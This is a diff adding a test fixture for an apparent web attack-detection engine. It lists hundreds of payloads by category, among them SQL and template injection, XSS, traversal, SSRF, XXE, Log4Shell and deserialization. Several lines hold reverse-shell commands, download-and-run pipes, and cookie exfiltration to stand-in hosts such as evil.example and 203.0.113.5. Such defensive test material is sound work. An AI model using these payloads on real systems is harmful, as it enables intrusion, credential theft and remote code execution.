@@ -1,0 +1,974 @@
+# Attacks the engine must catch. One per line, TAB separated:
+#   category[|category…]   target   [M=METHOD]   [H:Header-Name=value]…
+# A category with a leading ~ only has to be flagged (a probe, or a hit under
+# 5 points); without it the request must be a payload (5+ points: dropped).
+# Spaces in a target are sent as %20 and, in a second run, every query value
+# is percent-encoded again: both must be caught.
+# ------------------------------------------------------------------ SQL injection
+sqli	/item?id=1' OR '1'='1
+sqli	/item?id=1 OR 1=1
+sqli	/item?id=1' OR 1=1-- -
+sqli	/login?user=admin'--
+sqli	/login?user=admin' #
+sqli	/login?user=admin'/*
+sqli	/p?id=1 AND 1=1
+sqli	/p?id=1' AND '1'='1
+sqli	/p?id=-1 UNION SELECT 1,2,3--
+sqli	/p?id=1 UNION ALL SELECT NULL,NULL,NULL--
+sqli	/p?id=1'/**/UnIoN/**/sElEcT/**/1,2--
+sqli	/p?id=1;DROP TABLE users--
+sqli	/p?id=1'; WAITFOR DELAY '0:0:5'--
+sqli	/p?id=1 AND SLEEP(5)
+sqli	/p?id=1' AND SLEEP(5) AND '1'='1
+sqli	/p?id=(SELECT(SLEEP(5)))
+sqli	/p?id=1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)
+sqli	/p?id=1' AND extractvalue(1,concat(0x7e,version()))--
+sqli	/p?id=1' AND updatexml(1,concat(0x7e,database()),1)--
+sqli	/p?id=1 ORDER BY 10--
+sqli	/p?id=1' ORDER BY 3-- -
+sqli	/p?id=1 GROUP BY 1,2,3--
+sqli	/p?id=1;SELECT pg_sleep(5)--
+sqli	/p?id=1)) OR ((1=1
+sqli	/p?id=' or ''='
+sqli	/p?id=" or ""="
+sqli	/p?id=1' || '1'='1
+sqli	/p?id=1'||(SELECT version())||'
+sqli	/p?id=1 AND 1=CONVERT(int,@@version)
+sqli	/p?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+sqli	/p?id=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0
+sqli	/p?id=1'%20OR%20'x'%3D'x
+sqli	/p?id=%27%20OR%201%3D1--
+sqli	/p?id=1+OR+1%3D1
+sqli	/p?id=1' or true--
+sqli	/p?id=admin' or 1=1#
+sqli	/p?id=1 AND 5678=5678
+sqli	/p?id=1) AND 5678=5678 AND (1=1
+sqli	/p?id=1 AND 3591=(SELECT 3591 FROM PG_SLEEP(5))
+sqli	/p?id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71,(SELECT (ELT(1=1,1))),0x71))s), 8446744073709551610, 8446744073709551610)))-- x
+sqli	/p?id=1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x5c,VERSION())),1)
+sqli	/p?id=1' and benchmark(10000000,md5(1))#
+sqli	/p?id=1 UNION SELECT @@version
+sqli	/p?id=1 AnD 1=1
+sqli	/p?id=1/**/OR/**/1=1
+sqli	/p?id=1%0aOR%0a1=1
+sqli	/p?id=1 /*!50000UNION*/ /*!50000SELECT*/ 1,2
+sqli	/p?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
+sqli	/p?id=1' and 1=0 union select null,load_file('/etc/passwd')--
+sqli	/products/1' OR '1'='1
+sqli	/user/1 union select 1,2
+sqli	/p?id=1 OR 'a'='a'
+sqli	/p?id=1;EXEC xp_cmdshell 'dir'--
+sqli	/p?id=1; exec master..xp_dirtree '\\203.0.113.5\x'--
+sqli	/p?id=1 AND 1=utl_inaddr.get_host_name((select user from dual))
+sqli	/p?id=1' AND 1=dbms_pipe.receive_message(('a'),10)--
+sqli	/p?id=1 AND randomblob(100000000)
+sqli	/p?id=1 and if(1=1,sleep(5),0)
+sqli	/p?sort=(case when (1=1) then id else name end)
+sqli	/p?order=id,(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)
+sqli	/p?id=1' AND 1=1 AND 'a'='a
+sqli	/p?id=1" AND "1"="1
+sqli	/p?id=1') OR ('1'='1
+sqli	/p?id=1' OR 'unusual' = 'unusual'
+sqli	/p?id=1 OR 2>1
+sqli	/p?id=1' OR 2>1--
+sqli	/p?id=1 or 1 like 1
+sqli	/p?id=1' AND 1=(SELECT 1)--
+sqli	/p?id=1;select * from users
+sqli	/p?id=1;shutdown--
+sqli	/p?id=1 AND ELT(1=1,SLEEP(5))
+sqli	/p?id=SLEEP(5)
+sqli	/p?id=pg_sleep(5)--
+sqli	/p?id=1'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+sqli	/p?id=if(now()=sysdate(),sleep(5),0)
+sqli	/p?id=0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+sqli	/p?id=-1 OR 3*2*1=6 AND 000525=000525 --
+sqli	/p?q=1 waitfor delay '0:0:15' --
+sqli	/p?q=(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(15)))v)+'"+(select(0)from(select(sleep(15)))v)+"*/
+~sqli	/p?q=1'"
+sqli	/p?id=1 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
+sqli	/p?id=@@version
+sqli	/p?name=x' UNION SELECT username||':'||password FROM users--
+sqli	/p?id=1 HAVING 1=1--
+sqli	/p?id=') or true--
+sqli	/p?id=') or ('a'='a
+sqli	/p?id=1' or '1'='1'/*
+sqli	/p?id=1 or sleep(5)#
+sqli	/p?id=1)) or sleep(5)#
+sqli	/p?id=" or sleep(5)="
+sqli	/p?id=1 AND row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)
+sqli	/p?id=1;DECLARE @x varchar(99);SET @x='a';EXEC(@x)
+sqli	/p?id=CHAR(65)%2BCHAR(66)%2B(SELECT TOP 1 name FROM sysobjects)
+sqli	/api/items?filter=name eq 'x' or 1 eq 1
+sqli	/p?id=1%2527%20OR%25201%253D1--
+sqli	/p?id=%u0027%20OR%201=1--
+sqli	/p?id=1' oR 'A'='a
+sqli	/p?id=1'%09or%09'1'='1
+sqli	/p?id=1'/*!or*/'1'='1
+sqli	/p?id=1 union/*&id=*/select 1,2--
+sqli	/p?user[]=admin' or 1=1--
+sqli	/rest/user/login?email=' or 1=1--
+# NoSQL injection
+sqli	/login?username[$ne]=x&password[$ne]=x
+sqli	/login?user[$gt]=&pass[$gt]=
+sqli	/p?q[$regex]=.*
+sqli	/p?$where=sleep(1000)
+sqli	/api?filter={"$where":"this.a==1"}
+sqli	/api/users?q={"username":{"$ne":null},"password":{"$ne":null}}
+sqli	/p?id=1';return true;var x='
+sqli	/p?user=admin'||'1'=='1
+sqli	/p?search[$where]=function(){return true}
+# LDAP and XPath injection
+sqli	/p?user=*)(uid=*))(|(uid=*
+sqli	/p?user=admin)(%26)
+sqli	/p?user=*)(|(objectclass=*)
+sqli	/p?q=' or count(/*)=1 or '
+sqli	/p?q=x'] | //user/*[contains(*,'
+# ------------------------------------------------------------------ XSS
+xss	/s?q=<script>alert(1)</script>
+xss	/s?q=<img src=x onerror=alert(1)>
+xss	/s?q=<svg/onload=alert(1)>
+xss	/s?q=<svg onload=alert`1`>
+xss	/s?q="><script>alert(document.domain)</script>
+xss	/s?q='><img src=x onerror=prompt(1)>
+xss	/s?url=javascript:alert(1)
+xss	/s?q=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+xss	/s?q=<body onload=alert(1)>
+xss	/s?q=<iframe src="javascript:alert(1)">
+xss	/s?q=<details open ontoggle=alert(1)>
+xss	/s?q=<a href="javascript:alert(1)">x</a>
+xss	/s?q=<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+xss	/s?q=<input autofocus onfocus=alert(1)>
+xss	/s?q=<video><source onerror=alert(1)>
+xss	/s?q=<marquee onstart=alert(1)>
+xss	/s?q=" onmouseover="alert(1)
+xss	/s?q=' onfocus='alert(1)' autofocus='
+xss	/s?q=';alert(String.fromCharCode(88,83,83))//
+xss	/s?q=</script><script>alert(1)</script>
+xss	/s?q={{constructor.constructor('alert(1)')()}}
+xss	/s?q=<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
+xss	/s?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+xss	/s?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E
+xss	/s?q=%26lt;script%26gt;alert(1)%26lt;/script%26gt;
+xss	/s?q=%26%2360;script%26%2362;alert(1)%26%2360;/script%26%2362;
+xss	/s?q=<scr<script>ipt>alert(1)</scr</script>ipt>
+xss	/s?q=<ScRiPt>alert(1)</sCrIpT>
+xss	/s?q=<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+xss	/s?q=<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+xss	/s?q=<embed src=javascript:alert(1)>
+xss	/s?q=<form action=javascript:alert(1)><input type=submit>
+xss	/s?q=<isindex type=image src=1 onerror=alert(1)>
+xss	/s?q=<x onclick=alert(1)>click
+xss	/s?q=<img src=x:alert(alt) onerror=eval(src) alt=0>
+xss	/s?q="><svg/onload=confirm(1)>
+xss	/s?q=<svg><script>alert%26%2340;1%26%2341;</script>
+xss	/s?q=<a href=javas%26%2399;ript:alert(1)>x</a>
+xss	/s?url=java%0ascript:alert(1)
+xss	/s?url=data:text/html,<script>alert(1)</script>
+xss	/s?q=<style>@import'//evil.example/x.css'</style>
+xss	/s?q=<base href=//evil.example/>
+xss	/s?q=<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+xss	/s?q=<img src="x" onerror="%26%2397;lert(1)">
+xss	/s?q=<svg onload=alert&lpar;1&rpar;>
+xss	/s?q=<img src=x onerror=window['al'+'ert'](1)>
+xss	/s?q=<img src=x onerror=top[8680439..toString(30)](1)>
+xss	/s?q=<iframe srcdoc="<script>alert(1)</script>">
+xss	/s?q=\"-alert(1)-\"
+xss	/s?q='-alert(1)-'
+xss	/s?q=<svg/onload=import('//evil.example')>
+xss	/s?q=<a/href="javascript%26colon;alert(1)">x</a>
+xss	/s?q=<img src=x onerror=fetch('//evil.example/?c='+document.cookie)>
+xss	/s?q=<script src=//evil.example/x.js></script>
+xss	/s?q=<script>document.location='http://evil.example/?c='+document.cookie</script>
+xss	/s?q=<img/src/onerror=alert(1)>
+xss	/s?q=<svg%0Aonload=alert(1)>
+xss	/s?q=<img%09src=x%09onerror=alert(1)>
+xss	/s?q=<img src=x onerror=\u0061lert(1)>
+xss	/s?q=<body/onpageshow=alert(1)>
+xss	/s?q=<select autofocus onfocus=alert(1)>
+xss	/s?q=<textarea autofocus onfocus=alert(1)>
+xss	/s?q=<keygen autofocus onfocus=alert(1)>
+xss	/s?q=<audio src=x onerror=alert(1)>
+xss	/s?q=<object data=javascript:alert(1)>
+xss	/s?q=<xss onafterscriptexecute=alert(1)><script>1</script>
+xss	/s?q=<a href="%26%23106;avascript:alert(1)">x</a>
+xss	/s?q=<a href="%26%23x6A;avascript:alert(1)">x</a>
+xss	/s?q=<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">x</text></a>
+xss	/s?q=<img src=x onerror=alert(document.cookie)//
+xss	/s?q=<svg onload=alert(1)//
+xss	/s?q=<img src=x onerror=alert(1)
+xss	/s?q="autofocus onfocus=alert(1) x="
+xss	/s?q=-prompt(8)-
+xss	/s?q=${alert(1)}
+xss	/s?q=<script>alert(1)
+xss	/s?q=<script/x>alert(1)</script>
+xss	/s?q=<script ~~~>alert(0%0)</script ~~~>
+xss	/s?q=<img src=`x` onerror=alert(1)>
+xss	/<script>alert(1)</script>
+xss	/page/"><svg/onload=alert(1)>
+xss	/s?callback=alert(1)//
+xss	/s?q=<div style="background:url(javascript:alert(1))">
+xss	/s?q=<div style="x:expression(alert(1))">
+xss	/s?q=<img src=x onerror=self[`al`+`ert`](1)>
+xss	/s?q=<svg><set onbegin=alert(1) attributename=x to=1>
+xss	/s?q=<img src=x onerror=Function`a${atob`YWxlcnQoMSk=`}```>
+xss	/s?q=<a href=javascript%26%2358;alert(1)>x</a>
+xss	/s?q=<a href="  javascript:alert(1)">x</a>
+xss	/s?q=<img src=x onerror=alert%26%2340;1%26%2341;>
+# ------------------------------------------------------------------ path traversal & file inclusion
+traversal	/../../../../etc/passwd
+traversal	/..%2f..%2f..%2fetc%2fpasswd
+traversal	/%2e%2e/%2e%2e/etc/passwd
+traversal	/..%252f..%252fetc/passwd
+traversal	/..%c0%af..%c0%afetc/passwd
+traversal	/....//....//etc/passwd
+traversal	/static/..%5c..%5cwindows%5cwin.ini
+traversal	/download?file=../../../../etc/passwd
+traversal	/download?file=....//....//etc/passwd
+traversal	/download?file=..%2f..%2fetc%2fpasswd
+traversal	/page?file=/etc/passwd
+traversal	/page?file=php://filter/convert.base64-encode/resource=index.php
+traversal	/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+
+traversal	/page?f=expect://id
+traversal	/page?file=C:\Windows\System32\drivers\etc\hosts
+traversal	/page?file=..\..\..\windows\win.ini
+traversal	/page?file=/proc/self/environ
+traversal	/page?file=../../../../var/log/apache2/access.log
+traversal|ssrf	/page?f=file:///etc/passwd
+traversal	/page?template=../../../../etc/shadow%00
+traversal	/page?file=/etc/passwd%00.jpg
+traversal	/page?f=....\/....\/etc/passwd
+traversal	/page?lang=../../../../../../../../../../etc/passwd%00
+traversal	/img?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+traversal	/page?file=..%u2216..%u2216etc%u2216passwd
+traversal	/page?path=/var/www/../../etc/hosts
+traversal	/page?f=../WEB-INF/web.xml
+traversal|secrets	/page?file=/root/.ssh/id_rsa
+traversal|secrets	/page?file=../../.bash_history
+traversal|secrets	/page?file=../config/database.yml
+traversal	/page?page=http://203.0.113.5/shell.txt?
+traversal	/page?include=http://evil.example/x.txt%00
+traversal	/page?inc=ftp://203.0.113.5/x.php
+traversal	/page?file=zip://uploads/x.jpg%23shell.php
+traversal	/page?file=phar://uploads/x.jpg/shell.php
+traversal	/page?file=/var/www/html/.htpasswd
+traversal	/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+traversal	/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd
+traversal	/?InternalDir=/../../../../windows&InternalFile=win.ini
+traversal	/page?file=/etc/shadow
+traversal	/page?doc=/etc/hosts
+traversal	/page?file=/windows/win.ini
+traversal	/page?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
+traversal	/page?f=..%c0%af..%c0%afetc%c0%afpasswd
+traversal	/page?f=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+traversal	/page?f=..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+traversal	/page?file=....//....//....//etc//passwd
+traversal	/page?file=/proc/self/cmdline
+traversal	/page?file=/proc/1/environ
+traversal	/page?file=../../../../../boot.ini
+traversal	/a/b/..;/..;/..;/etc/passwd
+traversal	/page?f=..///..///..///etc/passwd
+traversal	/page?file=php://input
+traversal	/page?f=../../../../../../usr/local/etc/php/php.ini
+traversal	/page?f=../../../../../etc/nginx/nginx.conf
+traversal	/page?f=../../../../app/config/parameters.yml
+traversal	/page?file=/var/run/secrets/kubernetes.io/serviceaccount/token
+# ------------------------------------------------------------------ command injection
+rce	/ping?host=127.0.0.1;id
+rce	/ping?host=127.0.0.1;cat /etc/passwd
+rce	/ping?host=127.0.0.1|id
+rce	/ping?host=127.0.0.1||id
+rce	/ping?host=127.0.0.1&&id
+rce	/ping?host=$(id)
+rce	/ping?host=`id`
+rce	/ping?host=127.0.0.1%0aid
+rce	/ping?host=127.0.0.1%0Awhoami
+rce	/ping?host=x;ls -la
+rce	/ping?host=x| nc -e /bin/sh 203.0.113.5 4444
+rce	/ping?host=x;bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
+rce	/ping?host=x;wget http://203.0.113.5/x.sh -O- | sh
+rce	/ping?host=x;curl http://evil.example/s|sh
+rce	/ping?host=x;python -c 'import socket,subprocess,os;s=socket.socket()'
+rce	/ping?host=x;perl -e 'use Socket;'
+rce	/ping?host=x;php -r '$sock=fsockopen("203.0.113.5",4444);'
+rce	/ping?host=a;sleep 10
+rce	/ping?host=a|sleep 5
+rce	/ping?host=$(sleep 5)
+rce	/ping?host=x;ping -c 10 127.0.0.1
+rce	/ping?host=x & ping -n 10 127.0.0.1 &
+rce	/ping?host=x| dir c:\
+rce	/ping?host=x & type c:\windows\win.ini
+rce	/ping?host=x;cat${IFS}/etc/passwd
+rce	/ping?host=x;c'a't /etc/passwd
+rce	/ping?host=x;/???/c?t /???/p??s??
+rce	/ping?host=x;{cat,/etc/passwd}
+rce	/ping?host=x;echo${IFS}vulnerable
+rce	/ping?host=$(echo${IFS}aWQ=|base64${IFS}-d|sh)
+rce	/ping?host=x;nslookup x.burpcollaborator.net
+rce	/ping?host=x|curl x.oastify.com
+rce	/ping?host=x;uname -a
+rce	/ping?host=x;id;
+rce	/run?cmd=whoami
+rce	/run?exec=ls
+rce	/run?cmd=cat+/etc/passwd
+rce	/ping?host=x;powershell -enc SQBFAFgA
+rce	/ping?host=x;certutil -urlcache -f http://203.0.113.5/a.exe a.exe
+rce	/ping?host=%3Bid
+rce	/ping?host=%26%26id
+rce	/ping?host=x;/bin/cat /etc/passwd
+rce	/ping?host=x || ping -c 5 evil.example
+rce	/ping?host=127.0.0.1%26%26dir
+rce	/ping?host=x;ncat 203.0.113.5 4444 -e /bin/bash
+rce	/ping?host=x;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+rce	/ping?host=x%0a/usr/bin/id
+rce	/ping?host=x;cat</etc/passwd
+rce	/ping?host=x;w'h'o'am'i
+rce	/ping?host=x;who\ami
+rce	/ping?host=x;$0 -c id
+rce	/ping?host=x%0d%0aid
+rce	/ping?host=x;/usr/bin/whoami
+rce	/ping?host=x;cmd /c whoami
+rce	/ping?host=x|net user
+rce	/ping?host=x;env
+rce	/ping?host=x;printenv
+rce	/ping?host=x;cat /proc/version
+rce	/ping?host=x;tac /etc/passwd
+rce	/ping?host=x;base64 /etc/passwd
+rce	/ping?host=x;busybox wget http://203.0.113.5/a
+rce	/ping?host=x;openssl s_client -quiet -connect 203.0.113.5:4444
+rce	/ping?host=x;socat tcp:203.0.113.5:4444 exec:sh
+rce	/ping?host=x;awk 'BEGIN{system("id")}'
+rce	/ping?host=x;xterm -display 203.0.113.5:1
+rce	/ping?host=x;echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==|base64 -d>s.php
+rce	/cgi-bin/test.cgi?x=;id
+rce	/?x=${IFS}id
+rce	/?q=x;getent passwd
+rce	/?x=a;(id)
+# PHP and code
+rce	/index.php?x=<?php system($_GET[c]); ?>
+rce	/index.php?c=system('id');
+rce	/index.php?c=phpinfo();
+rce	/index.php?c=passthru('id');
+rce	/index.php?x=eval($_POST[x])
+rce	/index.php?x=assert($_GET[a])
+rce	/index.php?x=file_put_contents('s.php','<?php ...')
+rce	/index.php?x=${@system(id)}
+rce	/index.php?x=preg_replace('/a/e','system("id")','a')
+rce	/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP
+rce	/index.php?s=/index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+rce	/?x=__import__('os').system('id')
+rce	/?x=require('child_process').execSync('id')
+rce	/?x=process.mainModule.require('child_process').exec('id')
+rce	/?x=Runtime.getRuntime().exec("id")
+rce	/?x=new java.lang.ProcessBuilder("id").start()
+rce	/?x=os.popen('id').read()
+rce	/?x=subprocess.check_output(['id'])
+rce	/?x=exec("import os")
+rce	/?x=`id`
+rce	/?x=;system('id')
+rce	/?x=Kernel.exec('id')
+rce	/?q=%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}
+rce	/?q=__proto__[isAdmin]=true
+rce	/?__proto__[polluted]=1
+rce	/?constructor[prototype][polluted]=1
+rce	/?a[__proto__][b]=1
+# ------------------------------------------------------------------ template injection
+ssti	/?name={{7*7}}
+ssti	/?name={{7*'7'}}
+ssti	/?name=${7*7}
+ssti	/?name=<%= 7*7 %>
+ssti	/?name=#{7*7}
+ssti	/?name=*{7*7}
+ssti	/?name={{config}}
+ssti	/?name={{config.items()}}
+ssti	/?name={{self.__init__.__globals__}}
+ssti	/?name={{''.__class__.__mro__[1].__subclasses__()}}
+ssti	/?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+ssti	/?name={{cycler.__init__.__globals__.os.popen('id').read()}}
+ssti	/?name={{lipsum.__globals__.os.popen('id').read()}}
+ssti	/?name={% import os %}{{os.system('id')}}
+ssti	/?name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+ssti	/?name=${T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	/?name=#set($x='')$x.class.forName('java.lang.Runtime')
+ssti	/?name=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+ssti	/?name={{ ''|attr('__class__') }}
+ssti	/?name=[[${7*7}]]
+ssti	/?name=__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
+ssti	/?name={php}echo `id`;{/php}
+ssti	/?name={system('id')}
+ssti	/?name={{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+ssti	/?name={{constructor.constructor('return process')()}}
+ssti	/?name={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
+ssti	/?name={{url_for.__globals__['current_app'].config}}
+ssti	/?name={{get_flashed_messages.__globals__}}
+ssti	/?name=${{7*7}}
+ssti	/?name={{ 7 * 7 }}
+ssti	/?name=@(7*7)
+ssti	/?name=${"freemarker.template.utility.Execute"?new()("id")}
+ssti	/?name={{dump(app)}}
+ssti	/?name={{app.request.server.all|join(',')}}
+ssti	/?name=${class.getClassLoader()}
+ssti	/?name=#{T(java.lang.Runtime).getRuntime().exec('id')}
+ssti	/?name={{['id']|filter('system')}}
+ssti	/?name={{'/etc/passwd'|file_excerpt(1,30)}}
+ssti	/?name=<%= system("id") %>
+ssti	/?name=${script:javascript:java.lang.Runtime.getRuntime().exec('id')}
+ssti|log4shell	/?name=${url:UTF-8:http://evil.example/}
+ssti|log4shell	/?name=${dns:address|evil.example}
+# ------------------------------------------------------------------ SSRF
+ssrf	/fetch?url=http://169.254.169.254/latest/meta-data/
+ssrf	/fetch?url=http://127.0.0.1:22
+ssrf	/fetch?url=http://localhost/admin
+ssrf	/fetch?url=gopher://127.0.0.1:6379/_FLUSHALL
+ssrf|traversal	/fetch?url=file:///etc/passwd
+ssrf	/fetch?url=dict://127.0.0.1:11211/stat
+ssrf	/fetch?url=http://[::1]/
+ssrf	/fetch?url=http://0x7f000001/
+ssrf	/fetch?url=http://2130706433/
+ssrf	/fetch?url=http://017700000001/
+ssrf	/fetch?url=http://127.1/
+ssrf	/fetch?url=http://0/
+ssrf	/fetch?url=http://metadata.google.internal/computeMetadata/v1/
+ssrf	/fetch?url=http://169.254.169.254.nip.io/
+ssrf	/fetch?url=http://127.0.0.1%2523@evil.example/
+ssrf	/fetch?url=http://①②⑦.⓪.⓪.①/
+ssrf	/fetch?url=http://0177.0.0.1/
+ssrf	/fetch?url=http://127.000.000.001/
+ssrf	/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/
+ssrf	/fetch?url=http://localtest.me/
+ssrf	/fetch?url=http://169.254.169.254%2flatest
+~ssrf	/fetch?url=http://10.0.0.1:8500/v1/agent/self
+ssrf	/fetch?url=http://[fd00:ec2::254]/latest/meta-data
+ssrf	/fetch?url=//169.254.169.254/latest/meta-data/
+ssrf	/fetch?url=http:169.254.169.254/latest
+ssrf	/fetch?url=http://instance-data/latest/
+ssrf	/fetch?url=netdoc:///etc/passwd
+ssrf	/fetch?url=jar:http://evil.example/x.zip!/x
+ssrf	/fetch?url=http://kubernetes.default.svc/api
+ssrf	/fetch?u=http://100.100.100.200/latest/meta-data/
+ssrf	/fetch?url=http://169.254.169.254/metadata/v1/
+ssrf	/fetch?url=http://0.0.0.0:6379
+ssrf	/fetch?url=http://127.127.127.127/
+ssrf	/fetch?url=http://2852039166/
+ssrf	/fetch?url=http://[::ffff:169.254.169.254]/
+ssrf	/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+ssrf	/fetch?url=http://169.254.170.2/v2/credentials
+ssrf	/fetch?url=ldap://127.0.0.1:389/
+ssrf	/fetch?url=http://user@127.0.0.1/
+ssrf	/fetch?url=http://localhost:2375/containers/json
+ssrf	/fetch?url=http://LOCALHOST/
+ssrf	/fetch?url=http://127.0.0.1.nip.io/
+ssrf	/fetch?url=http://spoofed.burpcollaborator.net/
+ssrf	/fetch?url=http://x.oastify.com/
+ssrf	/fetch?url=http://abc.interact.sh/
+ssrf	/fetch?url=sftp://evil.example:11111/
+ssrf	/fetch?url=tftp://evil.example:12346/TESTUDPPACKET
+~ssrf	/fetch?url=http://192.168.0.1/admin
+ssrf	/fetch?url=http://[0:0:0:0:0:0:0:1]:80/
+ssrf	/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/
+ssrf	/fetch?url=http://169.254.169.254&x=1
+ssrf	/fetch?url=http://[::]:80/
+ssrf	/api/geojson?url=file:///etc/passwd
+# ------------------------------------------------------------------ XXE
+xxe	/?xml=<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+xxe	/?xml=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/x.dtd"> %xxe;]>
+xxe	/?xml=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
+xxe	/?xml=<!ENTITY xxe SYSTEM "file:///etc/passwd">
+xxe	/?xml=<!DOCTYPE x SYSTEM "http://evil.example/x.dtd">
+# ------------------------------------------------------------------ Log4Shell & lookups
+log4shell	/?x=${jndi:ldap://evil.example/a}
+log4shell	/?x=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.example/a}
+log4shell	/?x=${${lower:j}ndi:${lower:l}dap://evil.example/a}
+log4shell	/?x=${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.example/a}
+log4shell	/?x=${jndi:dns://evil.example/a}
+log4shell	/?x=${jndi:rmi://evil.example/a}
+log4shell	/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D
+log4shell	/	H:User-Agent=${jndi:ldap://evil.example/a}
+log4shell	/?x=${${upper:j}ndi:ldap://evil.example/a}
+log4shell	/?x=${j${k8s:k5:-ND}i:ldap://evil.example/a}
+log4shell	/?x=${jn${date:''}di:ldap://evil.example/a}
+log4shell	/?x=${jndi:${lower:l}${lower:d}a${lower:p}://evil.example/a}
+log4shell	/?x=${${::-$}{jndi:ldap://evil.example/a}}
+log4shell	/?x=${${base64:JHtqbmRpOmxkYXA6Ly9ldmlsLmV4YW1wbGUvYX0=}}
+log4shell	/	H:Referer=${jndi:ldap://evil.example/a}
+log4shell	/	H:X-Api-Version=${jndi:ldap://evil.example/a}
+log4shell	/	H:Cookie=session=${jndi:ldap://evil.example/a}
+log4shell	/	H:X-Forwarded-For=${jndi:ldap://evil.example/a}
+log4shell	/?x=${jndi:ldaps://evil.example/a}
+log4shell	/?x=${jndi:iiop://evil.example/a}
+log4shell	/?x=${${::-j}ndi:rmi://evil.example/a}
+log4shell	/?x=${jndi:ldap://127.0.0.1#evil.example/a}
+log4shell	/?x=${env:AWS_SECRET_ACCESS_KEY}
+log4shell	/?x=${sys:java.version}
+# ------------------------------------------------------------------ deserialization
+deser	/?data=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3I
+deser	/?data=O:8:"stdClass":1:{s:4:"test";s:4:"test";}
+deser	/?data=a:2:{i:0;O:7:"Example":1:{s:4:"file";s:11:"/etc/passwd";}i:1;s:1:"x";}
+deser	/?data={"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.example/a","autoCommit":true}
+deser	/?data={"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}
+deser	/?data=AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMA
+deser	/?data=!!python/object/apply:os.system ["id"]
+deser	/?data=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.example/"]]]]
+deser	/?data=cos%0Asystem%0A(S'id'%0Atr.
+deser	/?data=gASVHAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==
+deser	/?data={"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+deser	/	H:Cookie=user=Tzo4OiJzdGRDbGFzcyI6MDp7fQ==; x=O:4:"User":2:{s:4:"name";s:5:"admin";}
+# ------------------------------------------------------------------ secrets & config hunting (seen in the wild)
+secrets	/.env
+secrets	/.env~
+secrets	/.env1
+secrets	/.env2
+secrets	/.env_copy
+secrets	/.env.production
+secrets	/.env.local
